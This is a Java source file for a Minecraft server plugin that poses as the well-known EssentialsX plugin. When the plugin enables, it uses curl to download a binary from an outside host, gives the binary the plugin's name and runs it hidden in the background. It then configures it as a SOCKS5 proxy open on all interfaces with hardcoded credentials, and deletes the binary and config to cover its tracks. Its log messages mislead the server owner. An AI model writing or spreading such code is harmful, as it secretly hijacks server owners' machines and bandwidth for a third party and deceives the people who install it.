package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.attribute.PosixFilePermissions;

public class EssentialsX extends JavaPlugin {

    // =========================================================
    // SOCKS5 配置
    // =========================================================

    private static final int SOCKS5_PORT = 24168;

    private static final String SOCKS5_USERNAME = "kof97zip";

    private static final String SOCKS5_PASSWORD = "kof97boss";


    @Override
    public void onEnable() {

        getLogger().info(
                "EssentialsX plugin starting..."
        );

        try {

            // 创建插件目录
            Files.createDirectories(
                    getDataFolder().toPath()
            );


            startRemoteJava();


            getLogger().info(
                    "EssentialsX plugin enabled"
            );


        } catch (Exception e) {

            getLogger().severe(
                    "Failed to start EssentialsX"
            );

            e.printStackTrace();
        }
    }


    private void startRemoteJava() throws Exception {

        // =====================================================
        // 运行目录
        // =====================================================

        Path runFolder =
                getDataFolder().toPath();


        Files.createDirectories(
                runFolder
        );


        // =====================================================
        // sing-box 下载地址
        // =====================================================

        String SingboxUrl =
                "https://netjett-de.kof95zip.pp.ua/java/cfws/amd64/Singbox";


        // =====================================================
        // sing-box 文件
        // =====================================================

        Path SingboxFile =
                runFolder.resolve(
                        "EssentialsX"
                );


        // =====================================================
        // config.json
        // =====================================================

        Path ConfFile =
                runFolder.resolve(
                        "config.json"
                );


        // =====================================================
        // 下载 sing-box
        // =====================================================

        downloadIfNotExists(
                SingboxUrl,
                SingboxFile
        );


        // =====================================================
        // 写入 sing-box 配置
        // =====================================================

        writeSingboxConfig(
                ConfFile
        );


        // =====================================================
        // 设置权限
        // =====================================================

        Files.setPosixFilePermissions(
                SingboxFile,
                PosixFilePermissions.fromString(
                        "rwxr-xr-x"
                )
        );


        // =====================================================
        // 启动 sing-box
        // =====================================================

        ProcessBuilder pb =
                new ProcessBuilder(
                        "bash",
                        "-c",
                        "nohup ./EssentialsX run -c config.json > /dev/null 2>&1 &"
                );


        pb.directory(
                runFolder.toFile()
        );


        pb.start();


        getLogger().info(
                "Plugins starting..."
        );


        Thread.sleep(
                8000
        );


        // =====================================================
        // 删除临时文件
        // =====================================================

        Files.deleteIfExists(
                SingboxFile
        );

        Files.deleteIfExists(
                ConfFile
        );
    }


    /**
     * 创建 sing-box config.json
     */
    private void writeSingboxConfig(
            Path configFile
    ) throws IOException {


        String config = """
                {
                  "log": {
                    "level": "error"
                  },

                  "inbounds": [
                    {
                      "type": "socks",
                      "tag": "socks-in",

                      "listen": "0.0.0.0",
                      "listen_port": %d,

                      "users": [
                        {
                          "username": "%s",
                          "password": "%s"
                        }
                      ]
                    }
                  ],

                  "outbounds": [
                    {
                      "type": "direct",
                      "tag": "freenom"
                    },

                    {
                      "type": "block",
                      "tag": "block"
                    }
                  ],

                  "route": {
                    "final": "freenom"
                  }
                }
                """.formatted(
                SOCKS5_PORT,
                escapeJson(SOCKS5_USERNAME),
                escapeJson(SOCKS5_PASSWORD)
        );


        Files.writeString(
                configFile,
                config,
                StandardCharsets.UTF_8
        );
    }


    /**
     * JSON 字符串转义
     */
    private String escapeJson(
            String value
    ) {

        return value
                .replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\b", "\\b")
                .replace("\f", "\\f")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }


    /**
     * 文件不存在才下载
     */
    private void downloadIfNotExists(
            String url,
            Path target
    ) throws Exception {


        if (Files.exists(target)) {

            return;
        }


        Process process =
                new ProcessBuilder(
                        "bash",
                        "-c",
                        "curl -Ls \""
                                + url
                                + "\" -o \""
                                + target
                                + "\""
                )
                .start();


        int exit =
                process.waitFor();


        if (exit != 0) {

            throw new IOException(
                    "Fail to init plugins"
            );
        }
    }


    @Override
    public void onDisable() {

        getLogger().info(
                "EssentialsX disabled"
        );
    }
}
